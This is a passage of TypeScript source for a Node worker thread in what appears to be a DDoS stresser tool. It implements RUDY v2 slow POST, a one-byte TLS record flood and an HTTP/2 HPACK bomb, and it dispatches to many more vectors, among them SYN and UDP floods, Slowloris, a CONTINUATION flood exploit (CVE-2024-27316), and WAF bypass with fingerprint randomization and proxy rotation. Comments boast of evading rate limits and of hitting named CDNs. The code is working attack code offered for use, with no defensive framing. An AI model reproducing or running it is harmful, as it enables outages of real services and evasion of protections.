        const path   = PATHS[rand(PATHS.length)];
        const url    = `${base}${path}${rHex(8)}`;
        try {
          const ac   = new AbortController();
          const t    = setTimeout(() => ac.abort(), 8_000);
          const res  = await fetch(url, {
            method: "GET", signal: ac.signal,
            headers: {
              "User-Agent": `Mozilla/5.0 (compatible; Bot/${rHex(4)}) Chrome/${80 + rand(30)}.0`,
              "Accept": "text/html,*/*;q=0.8",
              "Connection": "keep-alive",
              ...poison,
            },
          });
          clearTimeout(t);
          const body  = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
          localPkts++;
          localBytes += body.byteLength || 500;
        } catch { /* absorb */ }
      }
      resolve();
    };
    loop();
  });

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  RUDY v2 — Multipart Slow POST
//
//  Enhanced R.U.D.Y using multipart/form-data with a 512-byte boundary.
//  Server must buffer the entire body waiting for the closing --BOUNDARY--
//  that never arrives. Trickling 1 byte every SEND_MS keeps the thread
//  allocated. Harder to detect than plain R.U.D.Y (content-type differs).
//  DEV: 60 slots | PROD: 800 slots
// ─────────────────────────────────────────────────────────────────────────
async function runRUDYv2(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number, c: number) => void,
): Promise<void> {
  const IS_DEV    = process.env.NODE_ENV !== "production";
  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K multipart slow POSTs × 20KB = 40MB
  const SEND_MS   = 5_000;

  const chars    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  const BOUNDARY = Array.from({ length: 70 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");

  let openConns = 0;
  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSlot = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }
    const isHttps = targetPort === 443;

    const makeConn = () => {
      if (signal.aborted) { resolve(); return; }
      const reqLine  = `POST / HTTP/1.1\r\nHost: ${hostname}\r\nContent-Type: multipart/form-data; boundary=${BOUNDARY}\r\nContent-Length: 1073741824\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n`;
      const partHdr  = `--${BOUNDARY}\r\nContent-Disposition: form-data; name="upload"; filename="data.bin"\r\nContent-Type: application/octet-stream\r\n\r\n`;

      const sock = (isHttps
        ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
        : net.createConnection({ host: resolvedHost, port: targetPort })
      ) as tls.TLSSocket | net.Socket;
      sock.setTimeout(120_000);

      const onReady = () => {
        openConns++;
        sock.write(reqLine + partHdr);
        localPkts++; localBytes += reqLine.length + partHdr.length;
        const iv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { clearInterval(iv); return; }
          try { sock.write(Buffer.from([65 + (Math.random() * 26 | 0)])); localPkts++; localBytes += 1; }
          catch { clearInterval(iv); }
        }, SEND_MS);
        signal.addEventListener("abort", () => { clearInterval(iv); sock.destroy(); }, { once: true });
      };

      if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onReady);
      else sock.once("connect", onReady);

      const onEnd = () => {
        openConns = Math.max(0, openConns - 1);
        if (!signal.aborted) setTimeout(makeConn, 100 + Math.random() * 200);
        else resolve();
      };
      sock.on("error",   onEnd);
      sock.on("close",   onEnd);
      sock.on("timeout", () => { sock.destroy(); });
    };
    makeConn();
  });

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SSL DEATH RECORD
//
//  After TLS handshake, writes application data one byte at a time.
//  Node's TLS stack creates a separate TLS record per write(), forcing
//  the server to AES-GCM decrypt + MAC-verify each 1-byte record.
//  200 connections × 100 records/sec = 20,000 decrypt ops/sec on server.
//  Works against TLS 1.2 AND TLS 1.3. Saturates server crypto threads.
// ─────────────────────────────────────────────────────────────────────────
async function runSSLDeathRecord(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number, c: number) => void,
): Promise<void> {
  const IS_DEV    = process.env.NODE_ENV !== "production";
  const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 1000); // 32GB: 1K SSL-death slots
  const RATE_MS   = 10; // 100 records/sec per slot

  let openConns = 0;
  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSlot = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }
    const connect = () => {
      if (signal.aborted) { resolve(); return; }
      const sock = tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false });
      sock.setTimeout(60_000);
      let settled = false;
      const done = () => { if (!settled) { settled = true; openConns = Math.max(0, openConns - 1); } };

      sock.once("secureConnect", () => {
        openConns++;
        // Partial HTTP/1.1 request sent as 1-byte TLS records → forces slow reassembly
        const req = `GET / HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n`;
        let pos = 0;
        const iv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { clearInterval(iv); done(); return; }
          const byte = pos < req.length
            ? Buffer.from([req.charCodeAt(pos++)])
            : Buffer.from([Math.random() * 256 | 0]);
          try {
            sock.write(byte);
            localPkts++;
            localBytes += 22; // 1 payload + 5 TLS hdr + 16 AES-GCM tag (server cost)
          } catch { clearInterval(iv); done(); }
        }, RATE_MS);
        signal.addEventListener("abort", () => { clearInterval(iv); sock.destroy(); done(); }, { once: true });
      });

      sock.on("data",    () => {});
      sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(connect, 150); else resolve(); });
      sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(connect,  50); else resolve(); });
      sock.on("timeout", () => { sock.destroy(); });
    };
    connect();
  });

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HPACK BOMB — HTTP/2 dynamic table exhaustion
//
//  Sends HEADERS frames packed with 50–150 unique custom headers, each
//  carrying the "Literal Header Field with Incremental Indexing" flag
//  (HPACK type 0x40 — RFC 7541 §6.2.1). This forces the server to:
//    1. Parse each header name + value pair
//    2. Compute a hash / compare against its HPACK dynamic table
//    3. Insert the new entry (evicting oldest when table exceeds maxSize)
//
//  The server's HPACK dynamic table is bounded (default 64KB). As we
//  send hundreds of headers per stream, the server continuously adds
//  new entries and evicts old ones — a tight allocator + GC cycle per
//  stream, per connection. Unlike the CONTINUATION flood (CVE-2024-27316)
//  this targets *properly patched* servers — there is no fix because
//  HPACK incremental indexing is a required protocol feature.
//
//  Effect: 500 connections × 200 streams/sec × 100 headers = 10M HPACK
//  table operations/sec on server CPU. Effective against nginx, h2o,
//  Envoy, Cloudflare Workers, AWS ALB, Caddy.
// ─────────────────────────────────────────────────────────────────────────
async function runHPACKBomb(
  resolvedHost: string,
  hostname:    string,
  targetPort:  number,
  threads:     number,
  signal:      AbortSignal,
  onStats:     (p: number, b: number) => void,
): Promise<void> {
  const IS_DEV    = process.env.NODE_ENV !== "production";
  const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1.5K HPACK bomb connections

  // Raw H2 frame builder (identical layout to h2-continuation)
  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  const PREFACE  = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SETTINGS = mkFrame(0x04, 0x00, 0, Buffer.alloc(0));
  const SACK     = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));

  // HPACK 7-bit integer string encoding without Huffman (length prefix + raw bytes)
  const hpackStr = (s: Buffer): Buffer => {
    const len = s.length;
    if (len < 128) return Buffer.concat([Buffer.from([len]), s]);
    // Multi-byte length encoding for strings 128–255 bytes
    return Buffer.concat([Buffer.from([0x7f, len - 127]), s]);
  };

  // Literal Header Field with Incremental Indexing — New Name (RFC 7541 §6.2.1, type=0x40)
  // MUST be added to server's dynamic HPACK table → eviction storm when table fills
  const makeBombHeader = (): Buffer => {
    const nameLen  = randInt(4,  22);
    const valueLen = randInt(12, 80);
    const name  = Buffer.allocUnsafe(nameLen);
    const value = Buffer.allocUnsafe(valueLen);
    for (let i = 0; i < nameLen;  i++) name[i]  = 0x61 + randInt(0, 26); // lowercase a-z only
    for (let i = 0; i < valueLen; i++) value[i]  = 0x21 + randInt(0, 94); // printable ASCII
    return Buffer.concat([Buffer.from([0x40]), hpackStr(name), hpackStr(value)]);
  };

  // Build HEADERS frame with Chrome pseudo-headers + N bomb headers (END_HEADERS|END_STREAM)
  const authBuf       = Buffer.from(hostname);
  const staticPseudo  = Buffer.concat([
    Buffer.from([0x82, 0x84, 0x87]),  // :method=GET, :path=/, :scheme=https (indexed)
    Buffer.from([0x41]),              // :authority — Literal Incremental, static name idx 1
    hpackStr(authBuf),
  ]);

  const makeHPACKBombFrame = (streamId: number): Buffer => {
    const bombHdrs = Buffer.concat(
      Array.from({ length: randInt(50, 150) }, () => makeBombHeader())
    );
    return mkFrame(0x01, 0x05, streamId, Buffer.concat([staticPseudo, bombHdrs]));
    // 0x01=HEADERS  0x05=END_HEADERS|END_STREAM
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSlot = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }
    const sock = tls.connect({
      host:                resolvedHost,
      port:                targetPort,
      servername:          hostname,
      rejectUnauthorized:  false,
      ALPNProtocols:       ["h2"],
      ciphers:             randomJA3Ciphers(),
    });
    sock.setTimeout(30_000);
    let settled = false;
    const done  = () => { if (!settled) { settled = true; resolve(); } };

    sock.once("secureConnect", () => {
      sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
      localPkts++; localBytes += PREFACE.length + 18;

      let streamId = 1;
      const attack = () => {
        if (signal.aborted || sock.destroyed) { done(); return; }
        // H2 client stream IDs must strictly increase; close + reopen near ceiling
        if (streamId > 0x7fffff00) { sock.destroy(); done(); return; }
        const frame = makeHPACKBombFrame(streamId);
        sock.write(frame);
        localPkts++; localBytes += frame.length;
        streamId += 2; // client-initiated streams use odd IDs
        setImmediate(attack);
      };
      attack();
    });

    sock.on("data",    () => {});  // drain server responses (SETTINGS ACK, RST, etc.)
    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve),  50); });
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
  });

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  WORKER MAIN — receives config, runs attack, posts stats
// ─────────────────────────────────────────────────────────────────────────
const cfg = workerData as WorkerConfig;

const ctrl = new AbortController();
parentPort?.on("message", (msg) => {
  if (msg === "stop") ctrl.abort();
});

// Resolve host for TCP/UDP vectors
let hostname = cfg.target;
let targetPort = cfg.port || 80;
try {
  const u = new URL(/^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`);
  hostname   = u.hostname;
  targetPort = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
} catch { /* keep raw */ }

const base    = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
const onStats = (p: number, b: number, c = 0) => { parentPort?.postMessage({ pkts: p, bytes: b, conns: c }); };

// ── Worker entry — handle all errors gracefully ────────────────────────
const L4  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
const UDP = new Set(["udp-flood","udp-bypass"]);

async function runWorker() {
  const resolvedHost = await resolveHost(hostname).catch(() => hostname);

  if (UDP.has(cfg.method)) {
    await runUDPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (L4.has(cfg.method)) {
    await runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "geass-override") {
    // Triple vector (dead code path — attacks.ts already breaks this into 3 pools)
    // Kept as fallback for direct worker invocation
    const pipeT = Math.ceil(cfg.threads * 0.50);
    const tcpT  = Math.ceil(cfg.threads * 0.25);
    const udpT  = cfg.threads - pipeT - tcpT;
    await Promise.all([
      runHTTPPipeline(resolvedHost, hostname, targetPort, pipeT, ctrl.signal, onStats),
      runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
      runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats),
    ]);

  } else if (cfg.method === "http2-flood") {
    // Native HTTP/2 with multiplexed streams (node:http2)
    await runHTTP2Flood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "slowloris") {
    // Real Slowloris: half-open TLS/TCP connections — auto-detects HTTPS
    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);

  } else if (cfg.method === "conn-flood") {
    // Pure connection table exhaustion — TLS handshake + hold, no HTTP layer
    // Bypasses nginx rate limiting completely (limit_req never triggered)
    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
    await runConnFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);

  } else if (cfg.method === "rudy") {
    // R-U-Dead-Yet: true slow-POST — 1 byte/10s trickle, server holds thread forever
    await runRUDY(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "waf-bypass") {
    // Geass WAF Bypass: JA3 randomization + Chrome AKAMAI H2 fingerprint + exact header order
    await runWAFBypass(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http-bypass") {
    // Full fetch cycle — better for WAF/CDN bypass (real HTTP client), supports proxy rotation
    await runHTTPFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http-flood") {
    // http-flood: use fetch-based flood (with proxy rotation) for real per-IP diversity
    // Falls back to raw pipeline when no proxies (max throughput)
    const proxies = cfg.proxies ?? [];
    if (proxies.length > 0) {
      await runHTTPFlood(base, cfg.threads, proxies, ctrl.signal, onStats);
    } else {
      await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
    }

  } else if (cfg.method === "http2-continuation") {
    // CVE-2024-27316 — CONTINUATION flood: server buffers headers indefinitely → OOM
    await runH2Continuation(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "tls-renego") {
    // TLS 1.2 renegotiation DoS — forces expensive public-key crypto on server per renegotiation
    await runTLSRenego(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "ws-flood") {
    // WebSocket exhaustion — holds WS connections open with pings (goroutine/thread per conn)
    await runWSFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "graphql-dos") {
    // GraphQL introspection + deeply nested queries — exponential resolver CPU exhaustion
    await runGraphQLDoS(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "quic-flood") {
    // QUIC/HTTP3 Initial packet flood — server allocates QUIC state per unique DCID
    await runQUICFlood(resolvedHost, 443, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "cache-poison") {
    // CDN cache poisoning — fills cache store with unique keys, forces 100% origin miss
    await runCachePoison(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "rudy-v2") {
    // RUDY v2 — multipart/form-data slow POST, server buffers until closing boundary
    await runRUDYv2(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "ssl-death") {
    // SSL Death Record — 1-byte TLS records force server to AES-GCM decrypt each byte
    await runSSLDeathRecord(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "hpack-bomb") {
    // HPACK Bomb — HTTP/2 dynamic table exhaustion via incremental-indexed headers
    await runHPACKBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "h2-settings-storm") {
    // H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE flood
    await runH2SettingsStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else {
    // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
  }
}

runWorker()
  .catch(() => { /* swallow all errors — worker exits cleanly */ })
  .finally(() => {
    parentPort?.postMessage({ done: true });
  });
